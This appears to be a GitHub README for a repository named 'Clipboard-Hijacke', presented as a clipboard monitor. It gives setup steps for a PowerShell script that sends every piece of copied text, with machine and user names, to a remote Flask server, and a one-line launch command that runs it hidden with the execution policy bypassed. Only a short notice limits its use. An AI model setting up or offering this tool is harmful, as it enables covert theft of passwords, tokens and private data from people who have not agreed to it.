---

# **📋 Real-Time Clipboard Monitor**

A lightweight, real-time clipboard monitoring system that detects new copied text and sends it to a server for centralized logging. Perfect for tracking clipboard activity in controlled environments, such as development testing or data aggregation tasks.

---

## **✨ Features**

- **Real-Time Monitoring**: Instantly detects and logs clipboard changes.
- **Automatic Logging**: Sends clipboard data, along with the machine name and username, to a server.
- **Simple & Lightweight**: Uses a Flask server and a PowerShell script for seamless integration.
- **Error-Resilient**: Handles unexpected errors gracefully to ensure uninterrupted operation.

---

## **🛠️ How It Works**

1. A **PowerShell script** monitors the clipboard for new content.  
2. When new text is copied, it sends the data to a **Flask server**.
3. The server logs the clipboard content along with the machine and user information to `clipboard_logs.txt`.

---

## **🚀 Getting Started**

### **1. Set Up the Flask Server**

#### Prerequisites:
- Python 3.8 or later.
- Basic knowledge of running Python scripts.

#### Steps:
1. **Clone this repository**:
   ```bash
   git clone https://github.com/Moajjem404/Clipboard-Hijacke.git
   cd Clipboard-Hijacke
   ```
2. **Install dependencies**:
   ```bash
   pip install flask
   ```
3. **Start the server**:
   ```bash
   python server.py
   ```
4. The server will run on `http://0.0.0.0:5000` by default. Feel free to modify the port in `server.py` if needed.

---

### **2. Configure the PowerShell Script**

#### Prerequisites:
- Windows OS with PowerShell 5.0 or later.

#### Steps:
1. Open the `clipboard_monitor.ps1` script in a text editor.
2. Replace `<your-server-ip>` with the IP or domain of your Flask server:
   ```powershell
   $url = "http://<your-server-ip>:5000/clipboard_receiver"
   ```
3. Save the changes and **run the script**:
   ```powershell
   powershell -NoP -NonI -W h -Exec Bypass .\clipboard_monitor.ps1
   ```

The script will now run continuously, monitoring and sending clipboard data as changes occur.

---

## **📂 Log Format**

The server logs clipboard data in `clipboard_logs.txt` in the following format:

```
[MACHINE_NAME] [USER_NAME] Clipboard: <copied_text>
```

---

## **⚙️ Customization**

- **Polling Interval**:  
   To adjust how frequently the script checks the clipboard, modify this line in `clipboard_monitor.ps1`:
   ```powershell
   Start-Sleep -Milliseconds 500
   ```
   Lower values increase responsiveness but use more CPU resources.

- **Server Port**:  
   Change the port in `app.py` if necessary:
   ```python
   app.run(host='0.0.0.0', port=<your-port>)
   ```

---

## **⚠️ Security Notice**

🚨 **IMPORTANT:** This tool is intended for **personal or controlled environments** only.  
⚠️ **DO NOT** use this tool in shared or public networks without proper authorization.

---

